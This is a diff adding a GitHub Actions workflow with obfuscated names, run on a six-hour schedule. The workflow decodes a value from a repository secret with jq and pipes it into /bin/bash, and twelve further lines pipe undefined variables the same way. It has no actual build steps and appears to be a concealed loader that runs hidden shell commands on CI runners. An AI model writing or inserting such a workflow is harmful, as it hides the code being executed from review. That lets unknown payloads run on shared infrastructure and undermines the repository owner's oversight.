@@ -1,0 +1,29 @@
+name: hongqizhngne
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hongqizhngne
+        env:
+          qvrtd40: ${{ secrets.qvrtd40 }}
+        run: |
+          echo $qvrtd40 | jq -r .pci857 | /bin/bash
+          echo $fwqn55 | jq -r .mjol03 | /bin/bash
+          echo $eeo7927 | jq -r .gk120 | /bin/bash
+          echo $m800 | jq -r .kkyx2 | /bin/bash
+          echo $r0 | jq -r .nmxl7099 | /bin/bash
+          echo $i0230 | jq -r .zxbr0 | /bin/bash
+          echo $zq4 | jq -r .sw8966 | /bin/bash
+          echo $bnezt0893 | jq -r .baht11 | /bin/bash
+          echo $nwwx43 | jq -r .dzt12502 | /bin/bash
+          echo $tyska55891 | jq -r .moahk00 | /bin/bash
+          echo $qi472 | jq -r .ohnl7 | /bin/bash
+          echo $qpgt24 | jq -r .wvpnb183 | /bin/bash
+          echo $eglds39553 | jq -r .zgha3 | /bin/bash
+
